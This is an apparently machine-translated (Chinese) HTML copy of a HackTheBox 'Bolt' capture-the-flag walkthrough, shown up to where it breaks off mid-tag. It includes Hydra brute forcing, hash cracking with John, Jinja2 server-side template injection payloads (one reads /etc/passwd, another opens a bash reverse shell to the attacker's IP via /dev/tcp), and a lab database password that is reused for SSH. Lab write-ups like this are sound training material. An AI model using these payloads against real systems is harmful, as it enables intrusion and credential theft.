<html>
<head>
<title>Bolt from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">来自黑客盒子的螺栓—详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/bolt-from-hackthebox-detailed-walkthrough-4d60edf0b945?source=collection_archive---------3-----------------------#2022-02-21">https://infosecwriteups.com/bolt-from-hackthebox-detailed-walkthrough-4d60edf0b945?source=collection_archive---------3-----------------------#2022-02-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="3478" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">展示完成盒子所需的所有工具和技术。</p><h1 id="34f9" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/583b8a57b49411b61e27be1fdab2040e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*64_IISZygxtjxvPb.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">从箱子上取下螺栓</figcaption></figure><p id="4752" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Bolt是HackTheBox上的中型机。我们找到一个有档案的网站，我们下载并发现许多文件和文件夹。在其中搜索，我们发现了一个sqlite数据库，我们从这个数据库中转储哈希值，并破解以向仪表板显示管理员凭据。经过一些枚举，我们发现一个子域托管主站点的演示版本。我们使用服务器端模板注入来获得一个作为用户的反向shell。围绕操作系统的更多枚举找到包含另一个子域的详细信息及其凭证的文件。我们也可以作为用户之一通过SSH访问，并在另一个数据库中找到更多信息。最终，我们有足够的信息来破解pgp加密的消息，并取回根密码。</p><p id="30dd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所需的技能是网络，操作系统和数据库枚举知识。学习的技能是SSTI和使用pgp加密。</p><h1 id="b519" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">初步侦察</h1><p id="15b6" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi ma"><img src="../Images/054b5f80412f11cde1521b839dd13641.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9Nvo_I095WhUOLBwQY6GKA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">螺栓的Nmap扫描</figcaption></figure><p id="dd30" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有两个网站要看，先试试端口80:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mf"><img src="../Images/3fab4e169ed90129f92eb53ac5c8798d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1180/format:webp/0*XO5klpb9gx82Yufc.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">端口80上的网站</figcaption></figure><p id="9eac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">点击这里没什么可看的，登录按钮把我们带到这里:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mg"><img src="../Images/f02660b66c7625fc4b9ffa6800fed946.png" data-original-src="https://miro.medium.com/v2/resize:fit:1182/format:webp/0*vgd0jvz13OKYzrC3.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">网站的登录页面</figcaption></figure><p id="682f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试了SQLi和一些明显的用户/密码组合，有趣的是，我在尝试admin用户时得到了这个结果:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/b2278ad15cb0318309d1748082fd2bc6.png" data-original-src="https://miro.medium.com/v2/resize:fit:746/format:webp/0*6yt-pzVc1c64nzkE.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">拒绝访问消息</figcaption></figure><h1 id="c4dd" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">九头蛇蛮力</h1><p id="74b7" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">所以我们可以假设有一个管理员用户。我将让Hydra尝试强行登录:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mi"><img src="../Images/d2fe9cff9a4b0b7b1671f63b2ee89835.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xJpGb1CUl8oQ7jDwEng10Q.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">九头蛇暴力强制管理员密码</figcaption></figure><p id="15d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在等待的时候，我看了看菜单，找到了这个下载页面:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mj"><img src="../Images/b53abaf48b7565c35ebbd518d7a2bf95.png" data-original-src="https://miro.medium.com/v2/resize:fit:1186/format:webp/0*o6z_bmV2F0yvrZxy.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Bolt网站的下载部分</figcaption></figure><p id="7b56" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我下载了tar文件，查看了一下里面的内容:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="3d2a" class="mp km iq ml b gy mq mr l ms mt">┌──(root💀kali)-[~/htb/bolt]<br/>└─# tar -xf image.tar<br/><br/>┌──(root💀kali)-[~/htb/bolt]<br/>└─# ls -l <br/>total 308728<br/>drwxr-xr-x 2 root root      4096 Mar  5  2021 47a36abf64f35c2950<br/>drwxr-xr-x 2 root root      4096 Mar  5  2021 67911cd2257b95677c<br/>drwxr-xr-x 2 root root      4096 Mar  5  2021 e378c04859185d27fa<br/>drwxr-xr-x 2 root root      4096 Mar  5  2021 05a7ea69ad8d508dab<br/>drwxr-xr-x 2 root root      4096 Mar  5  2021 352ed5c2e8a5e68162<br/>drwxr-xr-x 2 root root      4096 Mar  5  2021 25ed8fe92ad6130c6b<br/>drwxr-xr-x 2 root root      4096 Mar  5  2021 a3a5670950272789ad<br/>drwxr-xr-x 2 root root      4096 Mar  5  2021 b92e2f297441f8c5cf<br/>-rw-r--r-- 1 root root      3797 Mar  5  2021 1c21577a8fa50811.json<br/>drwxr-xr-x 2 root root      4096 Mar  5  2021 a791ac8eec9f14bc77<br/>drwxr-xr-x 2 root root      4096 Mar  5  2021 5029f6b527af2976f2<br/>drwxr-xr-x 2 root root      4096 Mar  5  2021 e256ffc588a3e6cb26<br/>-rw-r--r-- 1 kali kali 161765888 Oct 24 15:47 image.tar<br/>-rw-r--r-- 1 root root      1002 Jan  1  1970 manifest.json<br/>-rw-r--r-- 1 root root       119 Jan  1  1970 repositories</span></pre><p id="6473" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在其中一个文件夹中，我们看到了另一个tar文件:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="ba80" class="mp km iq ml b gy mq mr l ms mt">┌──(root💀kali)-[~/htb/bolt/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad]<br/>└─# ls<br/>json  layer.tar  VERSION</span></pre><p id="9542" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以递归地从任何包含tar的子文件夹中提取所有文件:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="45dc" class="mp km iq ml b gy mq mr l ms mt">┌──(root💀kali)-[~/htb/bolt]<br/>└─# find . -type f -iname "*.tar" -print0 -execdir tar xf {} \; -delete</span></pre><h1 id="dc44" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">邀请代码</h1><p id="0e70" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">现在我们可以在所有文件中查找感兴趣的字符串。这花了一段时间，但我最终找到了这个:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="98ee" class="mp km iq ml b gy mq mr l ms mt">┌──(root💀kali)-[~/htb/bolt]<br/>└─# grep -rn "Username" -A 3<br/>&lt;SNIP&gt;<br/>app/base/forms.py:17:    username = TextField('Username'     , id='username_create' , validators=[DataRequired()])<br/>app/base/forms.py-18-    email    = TextField('Email'        , id='email_create'    , validators=[DataRequired(), Email()])<br/>app/base/forms.py-19-    password = PasswordField('Password' , id='pwd_create'      , validators=[DataRequired()])<br/>app/base/forms.py-20-    invite_code = TextField('Invite Code', id='invite_code'    , validators=[DataRequired()])</span></pre><p id="2c41" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不知道invite_code是什么？这让我想到了这个:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="6cf7" class="mp km iq ml b gy mq mr l ms mt">┌──(root💀kali)-[~/htb/bolt/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad]<br/>└─# grep -rn "invite_code" -A 1<br/>&lt;SNIP&gt;<br/>app/base/routes.py:63:        code        = request.form['invite_code']<br/>app/base/routes.py-64-        if code != 'XNSS-HSJW-3NGU-8XTJ':</span></pre><h1 id="0df1" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">SQLite</h1><p id="fa3e" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">我当时不知道在哪里使用它，所以继续寻找。后来我找到了sqlite数据库:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mu"><img src="../Images/b0ebf652d2852ec59c2518241d61dedb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LTOJG2iKLoDgKXW2wG9_4A.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">SQLite数据库枚举</figcaption></figure><h1 id="98db" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">哈希破解</h1><p id="8d44" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">上面我已经打开了数据库文件，并转储了管理员密码散列。现在我们可以尝试破解它:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mv"><img src="../Images/e235b001e49741dac0c508767094861a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tHc4e9HQHRZCOCKGmj_YMg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">给那个散列命名</figcaption></figure><p id="5702" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看起来像是MD5地穴。让约翰来做吧:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="6f86" class="mp km iq ml b gy mq mr l ms mt">┌──(root💀kali)-[~/htb/bolt]<br/>└─# john hash.txt -format=md5crypt -w=/usr/share/wordlists/rockyou.txt      <br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])<br/>Will run 4 OpenMP threads<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>&lt;HIDDEN&gt;         (?)<br/>1g 0:00:00:00 DONE (2021-10-24 22:23) 2.000g/s doida..curtis13<br/>Session completed</span></pre><p id="0abc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这很快，但是回头看看Hydra，我们看到它在很久以前就通过强制登录页面找到了相同的密码:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mw"><img src="../Images/01d61eba5fe3afc174259c7217636845.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6OO79uViAnnAOurshxebRQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">九头蛇破解了密码</figcaption></figure><p id="7834" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们是来学习的，所以不要为此烦恼！</p><h1 id="c2be" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">仪表板访问</h1><p id="79ca" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">返回登录页面，使用我们现在拥有的凭据，我们会看到一个控制面板:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mx"><img src="../Images/765d5f614e23ea69a8873ccb52cea4ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*etAcEJwtkAKqV1cu.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">管理仪表板</figcaption></figure><p id="4db8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里没有很多，但我在直接聊天框中看到了一些有趣的东西:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi my"><img src="../Images/cc5477a457f86d54a1e3a66f96a7c522.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*3uJ20Q0byGbIzcy8.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">与亚历山大和莎拉聊天</figcaption></figure><h1 id="6897" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Gobuster</h1><p id="1ffe" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">Sarah提到了一个仅限invite的演示环境，之前我们在源代码中发现了一个invite代码。寻找子域的时间到了:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mz"><img src="../Images/28ab63ec02d6f4e1f8e69c9c171926d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fxkbz82cfBS8ro2mS4u03A.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Gobuster搜索子域</figcaption></figure><p id="4365" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有两个，将它们添加到/etc/hosts，然后查看演示，我们会看到与之前相同的登录页面，只是现在我们可以创建一个帐户:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi na"><img src="../Images/0da2f679058c39a5cd58814e3c4efccc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1328/format:webp/0*Lcz1aQBmP7_UoR51.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">在演示系统上创建一个帐户</figcaption></figure><h1 id="70a8" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">演示门户</h1><p id="b3b0" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">我们现在可以登录演示门户，并在此结束:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi nb"><img src="../Images/1717ce5a8958f28738008b5523272e56.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*SHL-K5wDGXeuwWoR.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">登录到演示门户</figcaption></figure><p id="817f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">环顾演示网站，我没有发现任何有趣的东西，但在底部，我注意到该网站是使用Flask创建的:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi nc"><img src="../Images/ac4f7c0e6423ee11dd047b14a7a95101.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Ez3V6i1xkSiWQ-L1.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">页脚显示网站是一个管理瓶</figcaption></figure><p id="c651" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在搜索漏洞时，我发现了很多有用的信息，比如黑客技巧<a class="ae nd" href="https://book.hacktricks.xyz/pentesting/pentesting-web/flask" rel="noopener ugc nofollow" target="_blank">这里</a>和<a class="ae nd" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" rel="noopener ugc nofollow" target="_blank">这里</a>。这让我看到了<a class="ae nd" href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti" rel="noopener ugc nofollow" target="_blank">这份</a>备忘单和<a class="ae nd" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" rel="noopener ugc nofollow" target="_blank">这份</a>指南。</p><h1 id="5045" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">SSTI</h1><p id="db72" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">在阅读和尝试了一些例子之后，我确认了我们在概要文件部分有一个服务器端模板注入漏洞。从PayloadsAllTheThings Jinja2示例中，我发现这个示例可以读取passwd文件:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="77ab" class="mp km iq ml b gy mq mr l ms mt">{{ get_flashed_messages.__globals__.__builtins__.open(“/etc/passwd”).read() <br/>}}</span></pre><p id="44ec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们只需转到用户的设置，并将其输入名称字段:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi ne"><img src="../Images/7522098c9e7de047483ebd53c099e8df.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*6Gng0QiAmqRVIE4j.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">在用户名字段中输入有效负载</figcaption></figure><p id="436a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">单击提交按钮，然后切换到另一个浏览器选项卡，登录mail.bolt.htb查看我们收到的电子邮件:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/116cfd9b97cdef2bd5da1eafd94a84cc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/0*eBawRkcZ3GxYotPr.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">检查用户确认配置文件更改的邮件</figcaption></figure><p id="292a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们单击该电子邮件中的链接，我们将收到第二封电子邮件，确认已进行了更改:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/0de37cd797a1c821d2c0f9858f226587.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/0*GdzE1LbQ5WOF7Utq.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">带有我们泄漏数据的确认电子邮件</figcaption></figure><h1 id="92c3" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">反向外壳</h1><p id="5f30" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">我们可以看到passwd文件的内容，确认我们有服务器端代码执行。现在我们可以用同样的方法来处理一个反向的shell。我不得不尝试几个不同的例子，最终我发现这一个可行:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="8e62" class="mp km iq ml b gy mq mr l ms mt">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(‘/bin/bash -c “/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.192/4444 0&gt;&amp;1”’).read() <br/>}}</span></pre><p id="70ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">像之前一样改变配置文件，提交，切换到邮件，并点击其中的链接，以启动我们的反向外壳。切换到Kali上等待的netcat监听器，我们看到我们连接上了:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="175e" class="mp km iq ml b gy mq mr l ms mt">┌──(root💀kali)-[~/htb/bolt]<br/>└─# nc -nlvp 4444  <br/>listening on [any] 4444 ...<br/>connect to [10.10.14.192] from (UNKNOWN) [10.10.11.114] 60402<br/>bash: cannot set terminal process group (997): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>www-data@bolt:~/demo$</span></pre><p id="ea18" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先让我们升级我们的外壳:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="cd8a" class="mp km iq ml b gy mq mr l ms mt">www-data@bolt:/$ which python3<br/>/usr/bin/python3<br/>www-data@bolt:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>www-data@bolt:/$ ^Z  <br/>zsh: suspended  nc -nlvp 4444<br/>┌──(root💀kali)-[~/htb/bolt]<br/>└─# stty raw -echo; fg<br/>[1]  + continued  nc -nlvp 4444<br/>www-data@bolt:/$</span></pre><p id="25ba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查我们有哪些用户:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="c36c" class="mp km iq ml b gy mq mr l ms mt">www-data@bolt:/etc/passbolt$ ls -l /home<br/>total 8<br/>drwxr-x--- 15 clark clark 4096 Feb 25  2021 clark<br/>drwxr-x--- 16 eddie eddie 4096 Aug 26 23:55 eddie</span></pre><h1 id="6734" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">密码文件</h1><p id="496a" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">两个用户，但无权访问他们。在尝试LinPEAS之前，我四处寻找任何不合适的地方，发现了这个文件夹:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="333e" class="mp km iq ml b gy mq mr l ms mt">www-data@bolt:/$ find . \! -group root -d -maxdepth 2 2&gt;/dev/null<br/>&lt;SNIP&gt;<br/>./etc/passbolt</span></pre><p id="084a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它位于/etc中，与那里的所有其他文件夹相比非常突出，因为它属于www-data组，而不是root。我快速检查了一下里面有什么有趣的东西:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="4ccc" class="mp km iq ml b gy mq mr l ms mt">www-data@bolt:/etc/passbolt$ grep -rn "password"     <br/>&lt;SNIP&gt;<br/>app.php:106:  'password' =&gt; env('CACHE_DEFAULT_PASSWORD', null),<br/>app.php:127:  'password' =&gt; env('CACHE_CAKECORE_PASSWORD', null),<br/>app.php:149:  'password' =&gt; env('CACHE_CAKEMODEL_PASSWORD', null),<br/>app.php:232:   * The keys host, port, timeout, username, password, client and tls<br/>app.php:242:  'password' =&gt; env('EMAIL_TRANSPORT_DEFAULT_PASSWORD', null),<br/>app.php:330:  'password' =&gt; env('DATASOURCES_DEFAULT_PASSWORD', ''),<br/>app.php:361:  'password' =&gt; env('DATASOURCES_TEST_PASSWORD', 'secret'),<br/>passbolt.php:3: * Passbolt ~ Open source password manager for teams<br/>passbolt.php:42:            'password' =&gt; '&lt;HIDDEN&gt;',</span></pre><p id="14b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在passbolt.php的文件中，我们找到了另一个网站和数据库凭证:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="60b9" class="mp km iq ml b gy mq mr l ms mt">'App' =&gt; [<br/>    // A base URL to use for absolute links.<br/>    // The url where the passbolt instance will be reachable to your end users.<br/>    // This information is need to render images in emails for example<br/>    'fullBaseUrl' =&gt; 'https://passbolt.bolt.htb',<br/>],<br/>// Database configuration.<br/>'Datasources' =&gt; [<br/>    'default' =&gt; [<br/>        'host' =&gt; 'localhost',<br/>        'port' =&gt; '3306',<br/>        'username' =&gt; 'passbolt',<br/>        'password' =&gt; 'rT2;jW7&lt;eY8!dX8}pQ8%',<br/>        'database' =&gt; 'passboltdb',<br/>    ],<br/>],</span></pre><p id="f3d0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">https上的这个网站是我们还没看的。我将passbolt子域添加到我的hosts文件中，然后浏览它，我们得到另一个登录表单:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/58fa0523acf327fbc778cd6820189fd6.png" data-original-src="https://miro.medium.com/v2/resize:fit:940/format:webp/0*sdvEiyssoK78GDS1.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Passbolt登录表单</figcaption></figure><p id="fc33" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然而，这个网站没有以任何方式连接到我们之前创建了一个电子邮件地址帐户的演示版。所以现在看来这是个死胡同。</p><p id="80f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回到passbolt.php文件，我尝试了我们找到的两个用户的凭证，以防他们重复使用密码:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="c979" class="mp km iq ml b gy mq mr l ms mt">www-data@bolt:/etc/passbolt$ su clark<br/>Password: <br/>su: Authentication failure<br/>www-data@bolt:/etc/passbolt$ su eddie<br/>Password: <br/>eddie@bolt:/etc/passbolt$</span></pre><h1 id="0361" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">以Eddie身份进行SSH访问</h1><p id="9264" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">成功！Eddie为他的用户帐户重用了数据库配置中的密码。让我们退出这个服务shell，通过SSH以他的身份登录:</p><pre class="lk ll lm ln gt mk ml mm mn aw mo bi"><span id="38ce" class="mp km iq ml b gy mq mr l ms mt">┌──(root💀kali)-[~/htb/bolt]<br/>└─# ssh eddie@bolt.htb<br/>eddie@bolt.htb's password: <br/>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-051300-generic x86_64)<br/><br/>You have mail.<br/>Last login: Mon Oct 25 06:40:23 2021 from 10.10.14.75<br/>eddie@bolt:~$</span></pre><p id="c8ec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它说我们有邮件，让我们检查属于埃迪的文件和文件夹，看看它可能在哪里:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi nh"><img src="../Images/46711b70c2a55ec364e7c5c85484316f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-vNYFX27AHrLfMY0p3a56A.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">在子文件夹中搜索属于埃迪的文件</figcaption></figure><p id="e820" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv 